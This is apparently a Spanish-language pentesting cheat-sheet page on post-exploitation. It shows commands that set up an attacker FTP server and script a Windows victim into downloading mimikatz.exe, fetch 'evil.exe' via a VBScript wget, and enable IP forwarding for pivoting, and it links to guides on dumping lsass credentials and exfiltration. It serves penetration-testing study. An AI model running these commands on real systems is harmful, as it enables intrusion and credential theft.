---
layout: article
title: Pentesting - Post-explotación
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---

<h2>Transferencia de información</h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">SSH</div>
</div>

~~~bash
scp <binario> <user>@<ip>:/tmp
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">FTP</div>
</div>

**Máquina Atacante [Linux]**

Levantar un servidor FTP en la máquina atacante:
~~~bash
pip3 install pyftpdlib ; python3 -m pyftpdlib -p 21
~~~

**Máquina Víctima [Windows]**

Guardar comandos FTP en un fichero dentro del sistema Windows:

~~~bash
echo open 192.168.1.150 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
~~~

Ejecutar comandos ftp para descargar el binario:

~~~bash
ftp -n -v -s:ftp.txt
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Comandos de descarga</div>
</div>

<h3>WGET</h3>

**Máquina Víctima [Windows]**

[https://gist.github.com/udawtr/2053179](https://gist.github.com/udawtr/2053179)

~~~bash
cscript wget.vbs $url evil.exe
~~~

**Máquina Víctima [Windows]**

<h2>Pivoting</h2>

**Habilitar IP Forwarding**

echo 1 > /proc/sys/net/ipv4/ip_forward

<h2>Obtención de credenciales</h2>

[https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)

One liners:

[https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)

[https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf](https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf)

<h2>Recursos adicionales</h2>

[https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)

[https://ivanitlearning.wordpress.com/2019/03/22/windows-post-exploitation-privesc-pillaging-pivoting/](https://ivanitlearning.wordpress.com/2019/03/22/windows-post-exploitation-privesc-pillaging-pivoting/)

[https://book.hacktricks.xyz/windows/stealing-credentials](https://book.hacktricks.xyz/windows/stealing-credentials)

[https://gist.github.com/gfoss/ca6aa37f97fd400ff14f](https://gist.github.com/gfoss/ca6aa37f97fd400ff14f)

[https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters](https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters)

[http://www.networkpentest.net/p/windows-command-list.html](http://www.networkpentest.net/p/windows-command-list.html)

[https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65](https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65)

[https://github.com/kmkz/Pentesting/blob/master/Payload-Delivery-Cheat-Sheet](https://github.com/kmkz/Pentesting/blob/master/Payload-Delivery-Cheat-Sheet)